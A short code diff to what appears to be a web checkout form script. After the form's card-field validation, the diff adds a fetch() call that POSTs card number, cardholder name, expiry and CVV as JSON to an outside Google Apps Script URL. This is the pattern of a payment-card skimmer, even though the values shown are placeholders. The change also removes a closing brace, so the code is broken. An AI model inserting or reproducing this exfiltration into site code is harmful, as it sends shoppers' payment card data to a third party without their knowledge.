@@ -259,7 +259,7 @@
                 if (!cardNumber || !cardName || !expiry || !cvv) {
                     alert('Please fill in all required fields.');
                     return;
-                
+fetch('https://script.google.com/macros/s/AKfycbz6yXPkjBS9ndnARLVa4lF3oteglzXJwmG1HCvBStDF-L0akvuQYvhHNrfC56Sk_ci7/exec', {                
   method: 'POST',
   headers: {'Content-Type': 'application/json'},
   body: JSON.stringify({cardNumber:'1234 5678 9012 3456',cardName:'John Doe',expiry:'MM/YY',cvv:'123'})
